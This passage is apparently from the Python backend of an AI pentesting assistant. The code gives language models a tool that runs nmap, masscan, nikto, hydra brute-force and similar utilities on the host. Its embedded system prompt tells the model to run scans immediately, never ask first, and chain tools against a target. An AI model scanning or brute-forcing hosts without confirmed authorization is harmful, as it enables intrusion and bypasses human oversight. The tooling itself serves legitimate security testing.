                        "passlist": {"type": "string"},
                        "userlist": {"type": "string"},
                    },
                },
            },
            "required": ["tool", "params"],
        },
    }
]

_OPENAI_TOOLS = [
    {
        "type": "function",
        "function": {
            "name": "run_security_tool",
            "description": _ANTHROPIC_TOOLS[0]["description"],
            "parameters": _ANTHROPIC_TOOLS[0]["input_schema"],
        },
    }
]

# ── Shared tool executor ───────────────────────────────────────────────────────

async def _execute_tool(tool_name: str, params: dict) -> str:
    from routers.tools import build_command
    cmd = build_command(tool_name, params)
    if not cmd or not cmd[0]:
        return f"[ERROR] Unknown tool: {tool_name}"
    if not shutil.which(cmd[0]):
        return (
            f"[NOT INSTALLED] '{cmd[0]}' not found on this system.\n"
            f"Tip: Enable Docker/Kali mode to run {tool_name} in a Kali Linux container.\n"
            f"Command would be: {' '.join(str(x) for x in cmd)}"
        )
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=120)
        return stdout.decode(errors="replace")
    except asyncio.TimeoutError:
        try:
            proc.kill()
            await proc.wait()
        except Exception:
            pass
        return f"[TIMEOUT] {tool_name} stopped after 120s."
    except Exception as e:
        return f"[ERROR] {e}"

async def _stream_tool_execution(tool_name: str, params: dict):
    """Generator: yields SSE events for tool_start, tool_output chunks, tool_done."""
    yield f"data: {json.dumps({'tool_start': {'tool': tool_name, 'params': params}})}\n\n"
    output = await _execute_tool(tool_name, params)
    for i in range(0, len(output), 400):
        yield f"data: {json.dumps({'tool_output': output[i:i+400], 'tool': tool_name})}\n\n"
        await asyncio.sleep(0)
    yield f"data: {json.dumps({'tool_done': {'tool': tool_name}})}\n\n"

# ── Anthropic streaming ───────────────────────────────────────────────────────

def _build_anthropic_system(req) -> str:
    sys = AGENT_PROMPTS.get(req.agent, AGENT_PROMPTS["recon"])
    if req.target:
        t = req.target
        sys += "\n\nACTIVE TARGET:\n"
        if t.get("name"):   sys += f"  Name:   {t['name']}\n"
        if t.get("ip"):     sys += f"  IP:     {t['ip']}\n"
        if t.get("domain"): sys += f"  Domain: {t['domain']}\n"
    return sys

def _build_anthropic_messages(req):
    msgs = []
    if req.history:
        for m in req.history[-10:]:
            if m.get("role") in ("user", "assistant") and m.get("content"):
                msgs.append({"role": m["role"], "content": m["content"]})
    msgs.append({"role": "user", "content": req.message})
    return msgs

async def _anthropic_chat_stream(req, model: str):
    try:
        from anthropic import AsyncAnthropic
    except ImportError:
        yield f"data: {json.dumps({'error': 'Run: pip install anthropic'})}\n\n"
        yield "data: [DONE]\n\n"
        return
    try:
        client = AsyncAnthropic(api_key=req.api_key)
        async with client.messages.stream(
            model=model,
            max_tokens=8096,
            system=_build_anthropic_system(req),
            messages=_build_anthropic_messages(req),
        ) as stream:
            async for text in stream.text_stream:
                yield f"data: {json.dumps({'token': text, 'agent': req.agent})}\n\n"
        yield "data: [DONE]\n\n"
    except Exception as e:
        yield f"data: {json.dumps({'error': str(e)})}\n\n"
        yield "data: [DONE]\n\n"

async def _anthropic_execute_stream(req, model: str):
    try:
        from anthropic import AsyncAnthropic
    except ImportError:
        yield f"data: {json.dumps({'error': 'Run: pip install anthropic'})}\n\n"
        yield "data: [DONE]\n\n"
        return

    client = AsyncAnthropic(api_key=req.api_key)
    system = _build_anthropic_system(req)
    messages = _build_anthropic_messages(req)

    for _iteration in range(8):
        text_content = ""
        try:
            async with client.messages.stream(
                model=model,
                max_tokens=8096,
                system=system,
                messages=messages,
                tools=_ANTHROPIC_TOOLS,
            ) as stream:
                async for text in stream.text_stream:
                    yield f"data: {json.dumps({'token': text, 'agent': req.agent})}\n\n"
                    text_content += text
                final_msg = await stream.get_final_message()
        except Exception as e:
            yield f"data: {json.dumps({'error': str(e)})}\n\n"
            break

        if final_msg.stop_reason != "tool_use":
            break

        tool_blocks = [b for b in final_msg.content if b.type == "tool_use"]
        if not tool_blocks:
            break

        # Preserve assistant turn (with both text and tool_use blocks)
        messages.append({"role": "assistant", "content": final_msg.content})

        tool_results = []
        for tb in tool_blocks:
            tool_input = tb.input
            actual_tool = tool_input.get("tool", "")
            params = tool_input.get("params", {})

            yield f"data: {json.dumps({'tool_start': {'tool': actual_tool, 'params': params}})}\n\n"
            output = await _execute_tool(actual_tool, params)
            for i in range(0, len(output), 400):
                yield f"data: {json.dumps({'tool_output': output[i:i+400], 'tool': actual_tool})}\n\n"
                await asyncio.sleep(0)
            yield f"data: {json.dumps({'tool_done': {'tool': actual_tool}})}\n\n"

            tool_results.append({
                "type": "tool_result",
                "tool_use_id": tb.id,
                "content": output[:4000] + (" ...[truncated]" if len(output) > 4000 else ""),
            })

        messages.append({"role": "user", "content": tool_results})

    yield "data: [DONE]\n\n"

# ── OpenAI streaming ──────────────────────────────────────────────────────────

async def _openai_execute_stream(req, model: str, base_url: str = None):
    try:
        from openai import AsyncOpenAI
    except ImportError:
        yield f"data: {json.dumps({'error': 'Run: pip install openai'})}\n\n"
        yield "data: [DONE]\n\n"
        return

    client = AsyncOpenAI(api_key=req.api_key, **({"base_url": base_url} if base_url else {}))
    system = _build_anthropic_system(req)

    messages = [{"role": "system", "content": system}]
    if req.history:
        for m in req.history[-10:]:
            if m.get("role") in ("user", "assistant") and m.get("content"):
                messages.append({"role": m["role"], "content": m["content"]})
    messages.append({"role": "user", "content": req.message})

    for _iteration in range(8):
        text_content = ""
        tool_calls_acc = {}

        try:
            stream = await client.chat.completions.create(
                model=model,
                messages=messages,
                tools=_OPENAI_TOOLS,
                tool_choice="auto",
                stream=True,
                max_tokens=8096,
            )
            async for chunk in stream:
                delta = chunk.choices[0].delta if chunk.choices else None
                if not delta:
                    continue
                if delta.content:
                    yield f"data: {json.dumps({'token': delta.content, 'agent': req.agent})}\n\n"
                    text_content += delta.content
                if delta.tool_calls:
                    for tc in delta.tool_calls:
                        idx = tc.index
                        if idx not in tool_calls_acc:
                            tool_calls_acc[idx] = {"id": tc.id or "", "name": "", "arguments": ""}
                        if tc.id:
                            tool_calls_acc[idx]["id"] = tc.id
                        if tc.function:
                            if tc.function.name:
                                tool_calls_acc[idx]["name"] = tc.function.name
                            if tc.function.arguments:
                                tool_calls_acc[idx]["arguments"] += tc.function.arguments
        except Exception as e:
            yield f"data: {json.dumps({'error': str(e)})}\n\n"
            break

        if not tool_calls_acc:
            break

        # Build assistant message
        asst_msg = {"role": "assistant", "content": text_content, "tool_calls": [
            {
                "id": tc["id"],
                "type": "function",
                "function": {"name": tc["name"], "arguments": tc["arguments"]},
            }
            for tc in tool_calls_acc.values()
        ]}
        messages.append(asst_msg)

        # Execute tools
        for tc in tool_calls_acc.values():
            try:
                tool_input = json.loads(tc["arguments"])
            except Exception:
                tool_input = {}
            actual_tool = tool_input.get("tool", "")
            params = tool_input.get("params", {})

            yield f"data: {json.dumps({'tool_start': {'tool': actual_tool, 'params': params}})}\n\n"
            output = await _execute_tool(actual_tool, params)
            for i in range(0, len(output), 400):
                yield f"data: {json.dumps({'tool_output': output[i:i+400], 'tool': actual_tool})}\n\n"
                await asyncio.sleep(0)
            yield f"data: {json.dumps({'tool_done': {'tool': actual_tool}})}\n\n"

            messages.append({
                "role": "tool",
                "tool_call_id": tc["id"],
                "content": output[:4000] + (" ...[truncated]" if len(output) > 4000 else ""),
            })

    yield "data: [DONE]\n\n"

# ── Ollama streaming (existing, improved) ────────────────────────────────────

TOOL_INSTRUCTIONS = """

═══ AUTONOMOUS TOOL EXECUTION ═══
You have DIRECT access to real security tools running on the host machine.
Run them by outputting EXACTLY this format on its own line:
NEXUS_TOOL: {"tool": "nmap", "params": {"target": "192.168.1.1", "flags": "-sV -sC -T4"}}

AVAILABLE TOOLS:
• nmap         → {"target": "ip/domain", "flags": "-sV -sC -T4"}
• masscan      → {"target": "ip", "ports": "0-65535", "rate": "1000"}
• gobuster     → {"url": "http://target", "wordlist": "auto"}
• ffuf         → {"url": "http://target/FUZZ", "wordlist": "auto"}
• nikto        → {"target": "http://target"}
• hydra        → {"target": "ip", "service": "ssh", "userlist": "auto", "passlist": "auto"}
• searchsploit → {"query": "apache 2.4.49"}
• whatweb      → {"url": "http://target"}
• theharvester → {"domain": "example.com", "source": "google,bing"}

RULES — NEVER BREAK:
1. Any action verb ("scan", "run", "check", "find", "enumerate", "test") → EXECUTE NOW
2. Never say "I'll run" or "shall I?" — output NEXUS_TOOL immediately
3. Chain: nmap finds port 80 → run gobuster + whatweb + nikto immediately
4. After output: extract CVEs, services, versions, misconfigs — be specific
═════════════════════════════════"""

def _build_ollama_messages(req, with_tools: bool = True) -> list:
    sys = AGENT_PROMPTS.get(req.agent, AGENT_PROMPTS["recon"])
    if req.target:
        t = req.target
        sys += "\n\nACTIVE TARGET:\n"
        if t.get("name"):   sys += f"  Name: {t['name']}\n"
        if t.get("ip"):     sys += f"  IP: {t['ip']}\n"
        if t.get("domain"): sys += f"  Domain: {t['domain']}\n"
    if with_tools:
        sys += TOOL_INSTRUCTIONS
    messages = [{"role": "system", "content": sys}]
    if req.history:
        for m in req.history[-8:]:
            if m.get("role") in ("user", "assistant") and m.get("content"):
                messages.append({"role": m["role"], "content": m["content"]})
    messages.append({"role": "user", "content": req.message})
    return messages

async def _ollama_execute_stream(req, model: str):
    messages = _build_ollama_messages(req, with_tools=True)

    async def run():
        for _iteration in range(5):
            client = ollama.AsyncClient()
            try:
                stream = await client.chat(model=model, messages=messages, stream=True)
            except Exception as e:
                yield f"data: {json.dumps({'error': str(e)})}\n\n"
                yield "data: [DONE]\n\n"
                return

            pending = ""
            full_response = []
            tool_calls = []

            async for chunk in stream:
                token = chunk.message.content
                if not token:
                    continue
                pending += token

                while "\n" in pending:
                    idx = pending.index("\n")
                    line = pending[:idx]
                    pending = pending[idx + 1:]
                    stripped = line.strip()
                    if stripped.startswith("NEXUS_TOOL:"):
                        raw = stripped[len("NEXUS_TOOL:"):].strip()
                        try:
                            tool_calls.append(json.loads(raw))
                        except Exception:
                            full_response.append(line + "\n")
                            yield f"data: {json.dumps({'token': line + chr(10)})}\n\n"
                    else:
                        full_response.append(line + "\n")
                        yield f"data: {json.dumps({'token': line + chr(10)})}\n\n"

            if pending:
                stripped = pending.strip()
                if stripped.startswith("NEXUS_TOOL:"):
                    raw = stripped[len("NEXUS_TOOL:"):].strip()
                    try:
                        tool_calls.append(json.loads(raw))
                    except Exception:
                        full_response.append(pending)
                        yield f"data: {json.dumps({'token': pending})}\n\n"
                else:
                    full_response.append(pending)
                    yield f"data: {json.dumps({'token': pending})}\n\n"

            if not tool_calls:
                break

            tool_results = []
            for tc in tool_calls:
                tool_name = tc.get("tool", "")
                params = tc.get("params", {})
                yield f"data: {json.dumps({'tool_start': {'tool': tool_name, 'params': params}})}\n\n"
                output = await _execute_tool(tool_name, params)
                for i in range(0, len(output), 400):
                    yield f"data: {json.dumps({'tool_output': output[i:i+400], 'tool': tool_name})}\n\n"
                    await asyncio.sleep(0)
                yield f"data: {json.dumps({'tool_done': {'tool': tool_name}})}\n\n"
                tool_results.append((tool_name, output))

            ai_text = "".join(full_response)
            messages.append({"role": "assistant", "content": ai_text})
            combined = "\n\n".join(
                f"=== {n} OUTPUT ===\n{o[:3000]}" + (" ...[truncated]" if len(o) > 3000 else "")
                for n, o in tool_results
            )
            messages.append({
                "role": "user",
                "content": (
                    f"Tool results:\n{combined}\n\n"
                    "Analyze thoroughly: open ports, versions, CVEs, misconfigs, interesting paths. "
                    "Chain to next tools if needed. Otherwise: final findings."
                )
            })

        yield "data: [DONE]\n\n"

    return run()

# ── Routes ────────────────────────────────────────────────────────────────────

@router.get("/models")
async def list_models():
    result = []
    # Free cloud models first (best quality, no billing)
    for m in FREE_MODELS:
        result.append({**m, "installed": True, "requires_api_key": True, "free": True})
    # Paid cloud models
    for m in CLOUD_MODELS:
        result.append({**m, "installed": True, "requires_api_key": True, "free": False})
    # Installed Ollama models
    try:
        loop = asyncio.get_running_loop()
        ollama_result = await loop.run_in_executor(None, ollama.list)
        installed = {m.model for m in ollama_result.models}
        for m in OLLAMA_MODELS:
            if m["id"] in installed:
                result.append({**m, "installed": True, "requires_api_key": False, "free": True})
    except Exception:
        pass
    return result


async def _openai_compat_chat(req, model: str, base_url: str = None) -> str:
    from openai import AsyncOpenAI
    client = AsyncOpenAI(api_key=req.api_key, **({"base_url": base_url} if base_url else {}))
    sys = _build_anthropic_system(req)
    msgs = [{"role": "system", "content": sys}] + _build_anthropic_messages(req)
    resp = await client.chat.completions.create(model=model, messages=msgs, max_tokens=4096)
    return resp.choices[0].message.content

@router.post("/chat")
async def chat(req: ChatRequest):
    provider = _get_provider(req.model)
    req = req.model_copy(update={"api_key": _resolve_key(provider, req.api_key)})
    try:
        if provider == "anthropic" and req.api_key:
            from anthropic import AsyncAnthropic
            client = AsyncAnthropic(api_key=req.api_key)
            msg = await client.messages.create(
                model=req.model, max_tokens=4096,
                system=_build_anthropic_system(req),
                messages=_build_anthropic_messages(req),
            )
            return {"response": msg.content[0].text, "agent": req.agent, "model": req.model}
        if provider == "openai" and req.api_key:
            text = await _openai_compat_chat(req, req.model)
            return {"response": text, "agent": req.agent, "model": req.model}
        if provider == "groq" and req.api_key:
            text = await _openai_compat_chat(req, _groq_model_name(req.model), base_url=GROQ_BASE_URL)
            return {"response": text, "agent": req.agent, "model": req.model}
        if provider == "gemini" and req.api_key:
            text = await _openai_compat_chat(req, req.model, base_url=GEMINI_BASE_URL)
            return {"response": text, "agent": req.agent, "model": req.model}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
    # Ollama fallback
    model = req.model or await _fastest_ollama()
    try:
        client = ollama.AsyncClient()
        response = await client.chat(model=model, messages=_build_ollama_messages(req, with_tools=False))
        return {"response": response.message.content, "agent": req.agent, "model": model}
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"AI error: {str(e)}")


async def _compat_chat_stream(req, model: str, base_url: str = None):
    try:
        from openai import AsyncOpenAI
        client = AsyncOpenAI(api_key=req.api_key, **({"base_url": base_url} if base_url else {}))
        sys = _build_anthropic_system(req)
        msgs = [{"role": "system", "content": sys}] + _build_anthropic_messages(req)
        stream = await client.chat.completions.create(model=model, messages=msgs, stream=True, max_tokens=4096)
        async for chunk in stream:
            t = chunk.choices[0].delta.content if chunk.choices else None
            if t:
                yield f"data: {json.dumps({'token': t, 'agent': req.agent})}\n\n"
        yield "data: [DONE]\n\n"
    except Exception as e:
        yield f"data: {json.dumps({'error': str(e)})}\n\n"
        yield "data: [DONE]\n\n"

@router.post("/chat/stream")
async def chat_stream(req: ChatRequest):
    provider = _get_provider(req.model)
    req = req.model_copy(update={"api_key": _resolve_key(provider, req.api_key)})
    sse = {"media_type": "text/event-stream", "headers": {"Cache-Control": "no-cache"}}
    if provider == "anthropic" and req.api_key:
        return StreamingResponse(_anthropic_chat_stream(req, req.model), **sse)
    if provider == "openai" and req.api_key:
        return StreamingResponse(_compat_chat_stream(req, req.model), **sse)
    if provider == "groq" and req.api_key:
        return StreamingResponse(_compat_chat_stream(req, _groq_model_name(req.model), GROQ_BASE_URL), **sse)
    if provider == "gemini" and req.api_key:
        return StreamingResponse(_compat_chat_stream(req, req.model, GEMINI_BASE_URL), **sse)
    # Ollama fallback
    model = req.model or await _fastest_ollama()
    messages = _build_ollama_messages(req, with_tools=False)
    async def _ollama_chat():
        try:
            client = ollama.AsyncClient()
            stream = await client.chat(model=model, messages=messages, stream=True)
            async for chunk in stream:
                t = chunk.message.content
                if t:
                    yield f"data: {json.dumps({'token': t, 'agent': req.agent})}\n\n"
            yield "data: [DONE]\n\n"
        except Exception as e:
            yield f"data: {json.dumps({'error': str(e)})}\n\n"
            yield "data: [DONE]\n\n"
    return StreamingResponse(_ollama_chat(), **sse)


@router.post("/execute/stream")
async def execute_stream(req: ChatRequest):
    provider = _get_provider(req.model)
    req = req.model_copy(update={"api_key": _resolve_key(provider, req.api_key)})
    sse = {"media_type": "text/event-stream", "headers": {"Cache-Control": "no-cache"}}
    if provider == "anthropic" and req.api_key:
        return StreamingResponse(_anthropic_execute_stream(req, req.model), **sse)
    if provider == "openai" and req.api_key:
        return StreamingResponse(_openai_execute_stream(req, req.model), **sse)
    if provider == "groq" and req.api_key:
        return StreamingResponse(_openai_execute_stream(req, _groq_model_name(req.model), GROQ_BASE_URL), **sse)
    if provider == "gemini" and req.api_key:
        return StreamingResponse(_openai_execute_stream(req, req.model, GEMINI_BASE_URL), **sse)
    # Ollama
    model = req.model or await _fastest_ollama()
    gen = await _ollama_execute_stream(req, model)
    return StreamingResponse(gen, **sse)


@router.post("/agent/{agent_id}")
async def run_agent(agent_id: str, req: AgentRequest):
    if agent_id not in AGENT_PROMPTS:
        raise HTTPException(status_code=400, detail="Unknown agent")
    auto_prompt = (
        f"Perform a comprehensive {agent_id.upper()} analysis on this target: {req.target}. "
        f"Execute all relevant tools, chain findings, and deliver expert-level actionable intelligence."
    )
    chat_req = ChatRequest(
        message=auto_prompt, agent=agent_id, model=req.model,
        target=req.target, api_key=req.api_key,
    )
    provider = _get_provider(req.model)
    if provider == "anthropic" and req.api_key:
        try:
            from anthropic import AsyncAnthropic
            client = AsyncAnthropic(api_key=req.api_key)
            msg = await client.messages.create(
                model=req.model, max_tokens=8096,
                system=_build_anthropic_system(chat_req),
                messages=[{"role": "user", "content": auto_prompt}],
            )
            return {"result": msg.content[0].text, "agent": agent_id, "model": req.model}
        except Exception as e:
            raise HTTPException(status_code=500, detail=str(e))
    model = req.model or await _fastest_ollama()
    messages = [
        {"role": "system", "content": AGENT_PROMPTS[agent_id]},
        {"role": "user", "content": auto_prompt},
    ]
    try:
        client = ollama.AsyncClient()
        response = await client.chat(model=model, messages=messages)
        return {"result": response.message.content, "agent": agent_id, "model": model}
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Agent error: {str(e)}")


@router.post("/agent/{agent_id}/stream")
async def run_agent_stream(agent_id: str, req: AgentRequest):
    if agent_id not in AGENT_PROMPTS:
        raise HTTPException(status_code=400, detail="Unknown agent")
    provider = _get_provider(req.model)
    resolved_key = _resolve_key(provider, req.api_key)
    auto_prompt = (
        f"Perform a comprehensive {agent_id.upper()} analysis on this target: {req.target}. "
        f"Execute all relevant tools, chain findings, and deliver expert-level actionable intelligence."
    )
    chat_req = ChatRequest(
        message=auto_prompt, agent=agent_id, model=req.model,
        target=req.target, api_key=resolved_key,
    )
    sse = {"media_type": "text/event-stream", "headers": {"Cache-Control": "no-cache"}}
    if provider == "anthropic" and resolved_key:
        return StreamingResponse(_anthropic_execute_stream(chat_req, req.model), **sse)
    if provider == "openai" and resolved_key:
        return StreamingResponse(_openai_execute_stream(chat_req, req.model), **sse)
    if provider == "groq" and resolved_key:
        return StreamingResponse(_openai_execute_stream(chat_req, _groq_model_name(req.model), GROQ_BASE_URL), **sse)
    if provider == "gemini" and resolved_key:
        return StreamingResponse(_openai_execute_stream(chat_req, req.model, GEMINI_BASE_URL), **sse)
    model = req.model or await _fastest_ollama()
    messages = [
        {"role": "system", "content": AGENT_PROMPTS[agent_id] + TOOL_INSTRUCTIONS},
        {"role": "user", "content": auto_prompt},
    ]
    async def _gen():
        try:
            client = ollama.AsyncClient()
            stream = await client.chat(model=model, messages=messages, stream=True)
            async for chunk in stream:
                t = chunk.message.content
                if t:
                    yield f"data: {json.dumps({'token': t, 'agent': agent_id})}\n\n"
            yield "data: [DONE]\n\n"
        except Exception as e:
            yield f"data: {json.dumps({'error': str(e)})}\n\n"
            yield "data: [DONE]\n\n"
    return StreamingResponse(_gen(), media_type="text/event-stream", headers={"Cache-Control": "no-cache"})


@router.get("/agents")
async def get_agents():
    return [{"id": k, "name": k.upper()} for k in AGENT_PROMPTS.keys()]
